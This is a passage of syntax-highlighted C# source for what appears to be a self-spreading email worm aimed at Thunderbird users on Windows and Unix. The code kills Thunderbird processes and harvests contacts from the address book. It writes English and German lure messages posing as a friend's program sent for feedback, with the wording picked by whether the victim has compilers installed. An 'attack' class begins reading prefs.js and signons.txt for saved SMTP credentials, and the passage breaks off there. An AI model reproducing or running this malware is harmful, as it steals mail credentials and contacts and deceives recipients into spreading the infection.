                    </span><span class="sc11">thunderbirddir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">DirectoryInfo</span><span class="sc10">(</span><span class="sc11">homefolder</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"/Library/Thunderbird/Profiles/"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">defaultdir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">thunderbirddir</span><span class="sc10">.</span><span class="sc11">GetDirectories</span><span class="sc10">(</span><span class="sc6">"*slt"</span><span class="sc10">)[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">ToString</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"/"</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">FileInfo</span><span class="sc0"> </span><span class="sc11">adds</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc11">defaultdir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"abook.mab"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">addressfile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">adds</span><span class="sc10">.</span><span class="sc11">OpenText</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">os</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PlatformID</span><span class="sc10">.</span><span class="sc11">Win32NT</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc1">/* WinXP code*/</span><span class="sc0">
                </span><span class="sc11">Process</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">processes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Process</span><span class="sc10">.</span><span class="sc11">GetProcessesByName</span><span class="sc10">(</span><span class="sc6">"THUNDE~1"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Process</span><span class="sc0"> </span><span class="sc11">pr</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">processes</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">pr</span><span class="sc10">.</span><span class="sc11">Kill</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">Thread</span><span class="sc10">.</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">1000</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">homefolder</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">ApplicationData</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">thunderbirddir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">DirectoryInfo</span><span class="sc10">(</span><span class="sc11">homefolder</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\Thunderbird\\Profiles\\"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">defaultdir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">thunderbirddir</span><span class="sc10">.</span><span class="sc11">GetDirectories</span><span class="sc10">()[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">ToString</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\"</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">FileInfo</span><span class="sc0"> </span><span class="sc11">adds</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc11">thunderbirddir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">defaultdir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"abook.mab"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">addressfile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">adds</span><span class="sc10">.</span><span class="sc11">OpenText</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">available</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">available</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">formatadds</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Regex</span><span class="sc0"> </span><span class="sc11">mail</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Regex</span><span class="sc10">(</span><span class="sc6">"[0-9a-zA-Z]+@[0-9a-zA-Z]+"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RegexOptions</span><span class="sc10">.</span><span class="sc11">None</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">Regex</span><span class="sc0"> </span><span class="sc11">separate</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Regex</span><span class="sc10">(</span><span class="sc6">"=|\\)"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RegexOptions</span><span class="sc10">.</span><span class="sc11">None</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">part</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">separate</span><span class="sc10">.</span><span class="sc11">Split</span><span class="sc10">(</span><span class="sc11">addressfile</span><span class="sc10">.</span><span class="sc11">ReadToEnd</span><span class="sc10">()))</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mail</span><span class="sc10">.</span><span class="sc11">IsMatch</span><span class="sc10">(</span><span class="sc11">part</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc11">addresses</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">part</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">gather</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">os</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">OSVersion</span><span class="sc10">.</span><span class="sc11">Platform</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">user</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">UserName</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">lang</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Thread</span><span class="sc10">.</span><span class="sc11">CurrentThread</span><span class="sc10">.</span><span class="sc11">CurrentCulture</span><span class="sc10">.</span><span class="sc11">TwoLetterISOLanguageName</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">getabook</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">available</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">formatadds</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">Exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">create</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* Create the message to send out depending on various informations */</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">title_en</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Programming"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">title_de</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Programmierung"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">title_default</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Programming"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">content_average_en</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Hi, \nI have recently started to try out programming! \nThis is one of my first programms. What do you think of it?"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">content_average_de</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Hi, \nich habe neulich angefangen zu programmieren! \nDas hier ist eines meiner ersten Programme. Was h?ltst du davon?"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">content_average_default</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Hi, \nI have recently started to try out programming! \nThis is one of my first programms. What do you think of it?"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">content_pro_en</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Hi, \nI wrote this program using a new approach. Please tell me what you think of it."</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">content_pro_de</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Hi, \nIch habe beim Schreiben dieses Programms einen neuen Ansatz verfolgt. Sag mir bitte was du davon h?lts."</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">content_pro_default</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Hi, \nI wrote this program using a new approach. Please tell me what you think of it."</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">content_notwin_en</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"\nIf the programm should not work instantly on your non-windows-system you probably need to execute it using mono. (mono-project.com)"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">content_notwin_de</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"\nWenn diese Programm sich auf deinem Nicht-Windows-System nich direkt ausf?hren lassen sollte musst du es wahrscheinlich durch Mono ausf?hren! (mono-project.com)"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">content_notwin_default</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"\nIf the programm should not work instantly on your non-windows-system you probably need to execute it using mono. (mono-project.com)"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">title</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">getlang</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc1">/* Return expected receiver's language */</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">.</span><span class="sc11">EndsWith</span><span class="sc10">(</span><span class="sc6">"de"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc6">"de"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">.</span><span class="sc11">EndsWith</span><span class="sc10">(</span><span class="sc6">"com"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">.</span><span class="sc11">EndsWith</span><span class="sc10">(</span><span class="sc6">"co.uk"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc6">"en"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc1">/* More languages to be supported go here */</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc6">"default"</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">getskill</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc1">/* Determines if the current user is a professional by checking for the programs GCC and Visual Studio */</span><span class="sc0">
            </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">os</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PlatformID</span><span class="sc10">.</span><span class="sc11">Unix</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Regex</span><span class="sc0"> </span><span class="sc11">separate</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Regex</span><span class="sc10">(</span><span class="sc6">":|;"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RegexOptions</span><span class="sc10">.</span><span class="sc11">None</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">syspath</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">separate</span><span class="sc10">.</span><span class="sc11">Split</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetEnvironmentVariable</span><span class="sc10">(</span><span class="sc6">"PATH"</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">foo</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">syspath</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">foo</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"/gcc"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">DirectoryInfo</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">programs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">DirectoryInfo</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">ProgramFiles</span><span class="sc10">)).</span><span class="sc11">GetDirectories</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DirectoryInfo</span><span class="sc0"> </span><span class="sc11">program</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">programs</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">program</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">().</span><span class="sc11">Contains</span><span class="sc10">(</span><span class="sc6">"Visual Studio"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">create</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">getlang</span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"de"</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">lang</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"de"</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">getskill</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">content_pro_de</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">content_average_de</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">os</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PlatformID</span><span class="sc10">.</span><span class="sc11">Unix</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">content_notwin_de</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">title</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">title_de</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">getlang</span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"en"</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">lang</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"en"</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">getskill</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">content_pro_en</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">content_average_en</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">os</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PlatformID</span><span class="sc10">.</span><span class="sc11">Unix</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">content_notwin_en</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">title</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">title_en</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">getskill</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">content_pro_default</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">content_average_default</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">os</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PlatformID</span><span class="sc10">.</span><span class="sc11">Unix</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">content_notwin_default</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">title</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">title_default</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">attack</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">25</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">password_base64</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">password</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">content</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">signon_content</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">Regex</span><span class="sc0"> </span><span class="sc11">separate1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc0"> </span><span class="sc11">prefs</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc0"> </span><span class="sc11">signons</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">attack</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">os</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PlatformID</span><span class="sc10">.</span><span class="sc11">Win32NT</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">prefs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">thunderbirddir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">defaultdir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"prefs.js"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">signons</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">thunderbirddir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">defaultdir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"signons.txt"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">prefs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc11">Go</span><span class="sc10">.</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">defaultdir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"prefs.js"</span><span class="sc10">);</span><span class="sc0">
